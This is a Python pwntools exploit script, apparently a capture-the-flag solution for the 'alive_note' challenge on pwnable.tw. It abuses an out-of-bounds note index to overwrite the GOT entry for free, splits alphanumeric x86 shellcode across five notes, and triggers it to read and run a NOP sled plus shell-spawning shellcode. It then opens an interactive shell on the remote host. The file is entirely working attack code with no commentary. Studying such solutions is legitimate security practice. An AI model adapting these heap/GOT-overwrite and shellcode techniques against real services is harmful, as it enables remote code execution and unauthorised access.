from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./pwnabletw_alive_note")
	elf = ELF("./pwnabletw_alive_note")
else:
	p = remote("chall.pwnable.tw","10300")
	elf = ELF("./pwnabletw_alive_note")

def add(index,name):
	p.sendafter("Your choice :","1")
	p.sendafter("Index :",str(index))
	p.sendafter("Name :",name)
	p.recvuntil("Done !\n")

def free(index):
	p.sendafter("Your choice :","3")
	p.sendafter("Index :",str(index))

def padding():
	add(-1,"a"*8)
	add(-1,"a"*8)
	add(-1,"a"*8)

def debugf():
	gdb.attach(p,"b *0x080488EA")

context.log_level = "debug"
s1 = "PYjAXEq8"
s2 = "4AHEEEq8"
s3 = "0AF49Eq8"
s4 = "0AGjzZq8"
s5 = "j7X44E2F"
index = (elf.got["free"] - 0x0804A080)/4
add(index,s1)
padding()
add(0,s2)
padding()
add(1,s3)
padding()
add(2,s4)
padding()
add(3,s5)
#debugf()
free(2)
payload = "\x90"*0x48 + asm(shellcraft.sh())
p.send(payload)
p.interactive()
